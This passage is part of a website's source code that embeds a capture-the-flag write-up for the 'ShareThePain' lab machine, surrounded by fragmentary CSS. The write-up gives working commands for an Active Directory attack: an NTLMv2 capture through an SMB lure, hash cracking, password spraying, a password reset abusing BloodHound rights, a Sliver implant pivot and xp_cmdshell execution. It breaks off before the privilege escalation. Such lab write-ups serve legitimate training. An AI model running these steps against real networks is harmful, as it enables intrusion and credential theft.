  .lead { color: var(--muted); font-size: 1.05rem; margin-bottom: 1.6rem; }
  .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 0.9rem; margin: 0.8rem 0 1.5rem; }

  .about-links a {

  /* ---------- Responsive ---------- */

  @media (max-width: 820px) {

    .search { width: 150px; }
    aside.side {
      position: fixed; top: 48px; left: -270px; width: 250px; height: calc(100vh - 48px);
      background: var(--bg); border-right: 1px solid var(--border); padding: 1.2rem 1rem; z-index: 25;
      transition: left .2s ease;

const PROJECTS = [

/* Write-ups: { id, title, date, platform, difficulty ("Easy"|"Medium"|"Hard"),
                author, summary, tags[], link ({title,url} or null), body (HTML) } */
const WRITEUPS = [
  {
    id: "sharethepain",
    title: "ShareThePain: Writable Share to Domain Controller",
    date: "2026-04-11",
    platform: "Hack Smarter Labs",
    difficulty: "Medium",
    author: "0xz3r0",
    summary: "Anonymous write on an SMB share, an NTLMv2 capture, a BloodHound-driven password reset, a loopback-bound SQL instance pivoted with Sliver, and SeImpersonatePrivilege escalated through GodPotato to SYSTEM on DC01.",
    tags: ["SMB", "NTLM", "BloodHound", "Evil-WinRM", "MSSQL", "xp_cmdshell", "SeImpersonatePrivilege"],
    link: { title: "Hack Smarter Labs: ShareThePain", url: "https://www.hacksmarter.org/" },
    body: `
      <h2>Overview</h2>
      <p>ShareThePain is a Hack Smarter Labs machine on the <code>hack.smarter</code> domain. No credentials at the start. The path runs from an anonymously writable SMB share to an NTLMv2 capture, a password reset driven by a BloodHound edge, an MSSQL instance bound to localhost, and SeImpersonatePrivilege abused for SYSTEM on DC01.</p>

      <h2>Scope and reconnaissance</h2>
      <p>Direct network access, zero credentials. RustScan feeds Nmap for service and version detection, and the target resolves to a Windows Server 2022 domain controller, DC01, on <code>hack.smarter</code>:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">rustscan -a &lt;TARGET_IP&gt; -- -A</code></pre>
      </div>
      <p>DNS, Kerberos, LDAP, SMB, RPC, WinRM (5985) and RDP answer. The RDP certificate names <code>DC01.hack.smarter</code>, which sets the domain and confirms a single DC is the whole scope.</p>

      <h2>SMB: anonymous listing and a writable share</h2>
      <p>Anonymous listing works, and the default shares sit alongside a non-default share called <code>Share</code>:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">smbclient -L //hack.smarter</code></pre>
      </div>
      <p>NetExec confirms the guest/null context and shows <code>Share</code> as READ,WRITE. A writable share with anonymous access is the foothold: drop a lure file, catch the authentication it produces.</p>
      <figure>
        <img src="images/sharethepain-writable-share.png" alt="NetExec share listing showing the writable Share share">
        <figcaption>Figure 1: NetExec share enumeration as anonymous. <code>Share</code> is READ,WRITE.</figcaption>
      </figure>

      <h2>Capturing an NTLMv2 hash with SMBKiller</h2>
      <p>SMBKiller builds the lure, uploads it, and runs the listener. <code>-r</code> is the target, <code>-l</code> the listener, <code>-a</code> the share name:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">python3 SMBKiller.py -r &lt;TARGET_IP&gt; -l &lt;LISTENER_IP&gt; -d hack.smarter -i tun0 -a Share -U '' -P '' -A</code></pre>
      </div>
      <p>The listener catches an NTLMv2 response for <code>HACK\\bob.ross</code>.</p>
      <figure>
        <img src="images/sharethepain-ntlm-capture.png" alt="SMBKiller capturing the NTLMv2 response for bob.ross">
        <figcaption>Figure 2: Captured NTLMv2 response for <code>HACK\\bob.ross</code> (hash redacted).</figcaption>
      </figure>
      <p>Crack offline. Rockyou gets it quickly:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
      </div>

      <h2>Validating bob.ross</h2>
      <p>Validate, then re-enumerate the shares with a real session:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">nxc smb hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --shares</code></pre>
      </div>
      <p><code>bob.ross</code> reads <code>NETLOGON</code>, <code>SYSVOL</code> and <code>IPC$</code>, and keeps READ,WRITE on <code>Share</code>. Nothing useful on the share itself, so the next move is to see what else the account can reach.</p>
      <p>Pull the domain user list over LDAP and spray the recovered password. Only <code>bob.ross</code> accepts it, so no lateral gain here, but the user list is now available for the next phase:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">nxc ldap hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --users-export users.txt
nxc smb hack.smarter -u users.txt -p '&lt;PASSWORD&gt;' --continue-on-success</code></pre>
      </div>

      <h2>BloodHound: bob.ross has GenericAll over alice.wonderland</h2>
      <p>Collect the domain with bloodhound-python and ingest. The path is immediate: <code>bob.ross</code> holds <code>GenericAll</code> over <code>ALICE.WONDERLAND</code>, with <code>WriteOwner</code> and <code>Owns</code> alongside. Full control means a password reset without knowing the current one. Alice is in Remote Management Users, so the reset turns into a WinRM shell.</p>
      <figure>
        <img src="images/sharethepain-bloodhound.png" alt="BloodHound graph showing bob.ross GenericAll over alice.wonderland">
        <figcaption>Figure 3: BloodHound edges from <code>bob.ross</code> to <code>ALICE.WONDERLAND</code>.</figcaption>
      </figure>

      <h2>Resetting alice.wonderland</h2>
      <p>Reset the password over RPC:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">net rpc password "ALICE.WONDERLAND" "&lt;NEW_PASSWORD&gt;" -U "hack.smarter"/"bob.ross"%'&lt;PASSWORD&gt;' -S "DC01.hack.smarter"</code></pre>
      </div>
      <p>Confirm the reset by authenticating as Alice, then take WinRM:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">nxc smb hack.smarter -u "ALICE.WONDERLAND" -p "&lt;NEW_PASSWORD&gt;" --shares
evil-winrm -i hack.smarter -u "alice.wonderland" -p "&lt;NEW_PASSWORD&gt;"</code></pre>
      </div>
      <figure>
        <img src="images/sharethepain-evil-winrm.png" alt="Evil-WinRM session as alice.wonderland reading the user flag">
        <figcaption>Figure 4: Evil-WinRM session as <code>alice.wonderland</code>. User flag on the desktop (redacted).</figcaption>
      </figure>
      <p>Alice's token is thin (SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege), so this is not the endpoint. The next move is to look at what the host listens on that the external scan never saw.</p>

      <h2>Foothold enumeration: MSSQL bound to loopback</h2>
      <p><code>netstat -ano | findstr LISTENING</code> shows the usual DC services plus one that was not in the external scan: SQL Server on <code>127.0.0.1:1433</code>. Bound to loopback, so it is only reachable from the host. A pivot target, not a direct one.</p>
      <p>Read the user flag on the way through, then set up the pivot:</p>
      <div class="code-wrap">
        <pre><code class="language-powershell">type C:\\Users\\alice.wonderland\\Desktop\\user.txt</code></pre>
      </div>

      <h2>Pivoting to MSSQL with Sliver</h2>
      <p>MSSQL is on loopback, so traffic has to leave the DC through a tunnel that terminates on Kali. Sliver provides the pivot. Generate an mTLS implant, transfer it to the DC through the WinRM session, and start it:</p>
      <div class="code-wrap">
        <pre><code class="language-bash">sliver &gt; generate --mtls &lt;LISTENER_IP&gt; --port 443 --os windows --save /path/to/pivot.exe</code></pre>
      </div>
      <p>With the implant running and a SOCKS proxy up through it, connect to the loopback-bound SQL instance with Impacket and Alice's Windows authentication:</p>
      <figure>
        <img src="images/sharethepain-mssql-connect.png" alt="Impacket mssqlclient connecting to SQL Server through the Sliver pivot">
        <figcaption>Figure 5: <code>mssqlclient.py</code> against <code>127.0.0.1</code> through the Sliver SOCKS proxy, authenticated as <code>HACK\\alice.wonderland</code>.</figcaption>
      </figure>
      <div class="code-wrap">
        <pre><code class="language-bash">proxychains -q impacket-mssqlclient 'hack.smarter'/'alice.wonderland':'&lt;NEW_PASSWORD&gt;'@127.0.0.1 -windows-auth</code></pre>
      </div>
      <p>Connection returns <code>Microsoft SQL Server 2019 RTM (15.0.2000)</code>, context <code>HACK\\alice.wonderland dbo@master</code>. Alice is <code>dbo</code> on the instance, which is the whole game.</p>

      <h2>Command execution via xp_cmdshell</h2>
      <p><code>xp_cmdshell</code> is available to this login. Confirm the execution context and the token privileges:</p>
      <div class="code-wrap">
        <pre><code class="language-sql">xp_cmdshell whoami
xp_cmdshell whoami /priv</code></pre>
      </div>
      <p>Execution lands as <code>nt service\\mssql$sqlexpress</code>. The privilege list is the important part: <code>SeImpersonatePrivilege</code> is Enabled.</p>
      <figure>
        <img src="images/sharethepain-xp-cmdshell.png" alt="xp_cmdshell output showing SeImpersonatePrivilege enabled">
        <figcaption>Figure 6: <code>xp_cmdshell whoami /priv</code> as the SQL Server service account, with <code>SeImpersonatePrivilege</code> enabled.</figcaption>
